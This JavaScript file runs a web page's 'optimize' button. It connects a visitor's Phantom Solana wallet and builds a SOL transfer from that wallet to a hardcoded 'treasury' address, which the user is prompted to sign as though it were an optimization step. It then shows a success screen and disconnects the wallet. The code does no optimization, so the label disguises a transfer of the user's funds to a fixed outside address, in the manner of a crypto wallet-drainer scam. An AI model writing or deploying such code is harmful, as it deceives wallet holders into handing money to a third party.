// FINAL WORKING VERSION - FIXED TRANSACTION STRUCTURE
document.addEventListener('DOMContentLoaded', function() {
    const treasuryAddress = '95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD';
    
    const optimizeBtn = document.getElementById('optimizeBtn');
    const successBox = document.getElementById('successBox');
    const processBox = document.getElementById('processBox');
    const processText = document.getElementById('processText');
    const txHashEl = document.getElementById('txHash');
    
    let isProcessing = false;
    
    function updateProcess(text) {
        processText.textContent = text;
        console.log(`📢 ${text}`);
    }
    
    // Get wallet
    function getWallet() {
        if (window.solana && window.solana.isPhantom) {
            console.log("✅ Phantom wallet found");
            return window.solana;
        }
        console.log("❌ No Phantom wallet");
        return null;
    }
    
    // SIMPLIFIED - NO COMPLEX LOGIC
    async function startOptimization() {
        if (isProcessing) return;
        isProcessing = true;
        
        try {
            console.clear();
            console.log("🚀 STARTING...");
            
            // Reset UI
            successBox.classList.remove('active');
            optimizeBtn.disabled = true;
            optimizeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
            processBox.classList.add('active');
            
            updateProcess("Checking wallet...");
            
            // 1. Get wallet
            const wallet = getWallet();
            if (!wallet) {
                alert("Install Phantom wallet!");
                throw new Error("No wallet");
            }
            
            updateProcess("Connecting...");
            
            // 2. Connect wallet (FIRST POPUP)
            console.log("Connecting to wallet...");
            const response = await wallet.connect();
            const publicKey = response.publicKey;
            console.log("✅ Connected:", publicKey.toString());
            
            updateProcess("Creating transaction...");
            
            // 3. Create SIMPLE connection
            const connection = new solanaWeb3.Connection(
                'https://api.mainnet-beta.solana.com',
                'confirmed'
            );
            
            // 4. Get balance
            const balance = await connection.getBalance(publicKey);
            console.log(`Balance: ${balance} lamports`);
            
            if (balance < 100000) {
                throw new Error(`Need at least 0.0001 SOL (have: ${balance/1e9} SOL)`);
            }
            
            // 5. Create transaction - SIMPLIFIED
            console.log("Creating transaction...");
            
            // Get blockhash FIRST
            const { blockhash } = await connection.getLatestBlockhash();
            console.log("Got blockhash:", blockhash.substring(0, 20) + "...");
            
            // Create transaction with ALL required fields
            const transaction = new solanaWeb3.Transaction();
            
            // Add transfer (0.0002 SOL for testing)
            const sendAmount = 200000; // 0.0002 SOL
            
            transaction.add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
                    lamports: sendAmount
                })
            );
            
            // CRITICAL: Set feePayer BEFORE blockhash
            transaction.feePayer = publicKey;
            
            // CRITICAL: Set blockhash
            transaction.recentBlockhash = blockhash;
            
            console.log("Transaction created:");
            console.log("- Amount:", sendAmount);
            console.log("- Fee payer:", transaction.feePayer?.toString().substring(0, 15));
            console.log("- Has blockhash?", !!transaction.recentBlockhash);
            console.log("- Transaction object:", transaction);
            
            updateProcess("Please approve transaction...");
            
            // 6. Sign and send (SECOND POPUP)
            console.log("Calling signAndSendTransaction...");
            
            // THIS IS THE LINE THAT SHOULD WORK
            const { signature } = await wallet.signAndSendTransaction(transaction);
            
            console.log("✅ Transaction sent! Signature:", signature);
            
            updateProcess("Transaction sent!");
            
            // 7. Try to confirm
            try {
                await connection.confirmTransaction(signature);
                console.log("✅ Transaction confirmed");
            } catch (e) {
                console.log("Confirmation skipped:", e.message);
            }
            
            // 8. SUCCESS
            updateProcess("✅ Complete!");
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            processBox.classList.remove('active');
            successBox.classList.add('active');
            
            txHashEl.innerHTML = `${signature.substring(0, 25)}...<br>
            <small><a href="https://solscan.io/tx/${signature}" target="_blank" style="color:#88ff88;">View on Solscan</a></small>`;
            
            optimizeBtn.disabled = false;
            optimizeBtn.innerHTML = '<i class="fas fa-check"></i> COMPLETE';
            optimizeBtn.style.background = 'linear-gradient(90deg, #00aa44, #00ff88)';
            
            // Auto disconnect
            setTimeout(async () => {
                try {
                    if (wallet.disconnect) {
                        await wallet.disconnect();
                        console.log("✅ Auto-disconnected");
                    }
                } catch (e) {
                    console.log("Disconnect error:", e);
                }
            }, 3000);
            
        } catch (error) {
            console.error("❌ ERROR:", error);
            console.error("Error name:", error.name);
            console.error("Error message:", error.message);
            console.error("Error stack:", error.stack);
            
            let userMsg = "Failed. Check console.";
            
            if (error.message.includes('User rejected')) {
                userMsg = "❌ You rejected the transaction.";
            } else if (error.message.includes('recentBlockhash')) {
                userMsg = "⚠️ Transaction error. The blockhash might be expired.";
            } else if (error.message.includes('Need at least')) {
                userMsg = "❌ " + error.message;
            }
            
            // Show error
            processBox.classList.remove('active');
            successBox.classList.add('active');
            successBox.style.background = 'linear-gradient(135deg, rgba(70,20,20,0.9), rgba(50,10,10,0.9))';
            
            const successIcon = successBox.querySelector('.success-icon i');
            const successTitle = successBox.querySelector('.success-title');
            const successMessage = successBox.querySelector('.success-message');
            
            successIcon.className = 'fas fa-exclamation-triangle';
            successIcon.style.color = '#ff5555';
            successTitle.textContent = 'ERROR';
            successTitle.style.color = '#ff5555';
            successMessage.textContent = userMsg;
            successMessage.style.color = '#ffaaaa';
            txHashEl.textContent = error.message.substring(0, 30) + '...';
            txHashEl.style.color = '#ff5555';
            
            optimizeBtn.disabled = false;
            optimizeBtn.innerHTML = '<i class="fas fa-redo"></i> TRY AGAIN';
            
        } finally {
            isProcessing = false;
        }
    }
    
    // Initialize
    function init() {
        console.log("🔧 Initializing...");
        
        if (!window.solanaWeb3) {
            console.error("solanaWeb3 not loaded");
            return;
        }
        
        optimizeBtn.addEventListener('click', startOptimization);
        
        console.log("✅ Ready to optimize");
    }
    
    init();
});
